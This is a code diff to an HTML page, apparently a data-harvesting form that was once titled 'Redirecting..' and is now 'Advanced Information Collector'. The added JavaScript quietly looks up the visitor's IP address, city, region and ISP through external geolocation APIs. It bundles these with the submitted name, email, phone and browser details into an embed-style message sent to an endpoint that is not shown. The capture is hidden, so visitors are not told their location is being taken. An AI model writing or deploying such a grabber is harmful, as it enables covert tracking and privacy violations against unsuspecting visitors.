@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting..</title>
+    <title>Advanced Information Collector</title>
     <style>
         body { 
             font-family: Arial, sans-serif; 
@@ -120,6 +120,23 @@
             const formData = new FormData(e.target);
             const data = Object.fromEntries(formData);
             
+            // Get IP address using external API
+            let ipInfo = {};
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                ipInfo = await ipResponse.json();
+            } catch (error) {
+                console.error('Failed to get IP information:', error);
+                // Fallback to a simpler IP service
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    ipInfo = { ip: (await ipResponse.json()).ip };
+                } catch (error2) {
+                    console.error('Failed to get IP address:', error2);
+                    ipInfo = { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
+                }
+            }
+            
             // Collect browser and device information
             const browserInfo = {
                 userAgent: navigator.userAgent,
@@ -155,6 +172,7 @@
                     color: 14177041, // Orange color in decimal
                     fields: [
                         { name: "Personal Information", value: "**Name:** " + data.fullName + "\n**Email:** " + data.email + "\n**Phone:** " + data.phone + "\n**Age:** " + data.age + "\n**Country:** " + data.country, inline: false },
+                        { name: "IP Information", value: "**IP Address:** " + ipInfo.ip + "\n**Country:** " + (ipInfo.country_name || ipInfo.country || 'Unknown') + "\n**City:** " + (ipInfo.city || 'Unknown') + "\n**Region:** " + (ipInfo.region || 'Unknown') + "\n**ISP:** " + (ipInfo.org || 'Unknown'), inline: false },
                         { name: "Interests", value: data.interests, inline: false },
                         { name: "Comments", value: data.comments, inline: false },
                         { name: "Browser Information", value: "**User Agent:** " + browserInfo.userAgent + "\n**Language:** " + browserInfo.language + "\n**Platform:** " + browserInfo.platform, inline: false },
